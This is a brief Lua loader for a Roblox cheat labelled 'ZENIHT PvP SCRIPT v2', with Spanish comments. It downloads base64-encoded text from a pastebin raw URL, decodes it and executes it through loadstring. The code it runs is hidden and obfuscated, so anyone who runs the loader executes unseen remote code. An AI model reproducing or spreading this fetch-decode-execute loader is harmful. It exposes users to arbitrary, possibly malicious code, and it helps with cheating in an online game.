--// 🔴 ZENIHT PvP SCRIPT v2 - Loader Oficial
--// 🔒 Protección Inicial | Base64 Decode
--// 🧠 By ZENIHT (github.com/yourprofile)

local HttpService = game:GetService("HttpService")
local s, err = pcall(function()
    local encoded = game:HttpGet("https://pastebin.com/raw/pTr9w8i3")
    local decoded = HttpService:Base64Decode(encoded)
    loadstring(decoded)()
end)

if not s then
    warn("[ZENIHT SCRIPT] Error al cargar el script:", err)
end
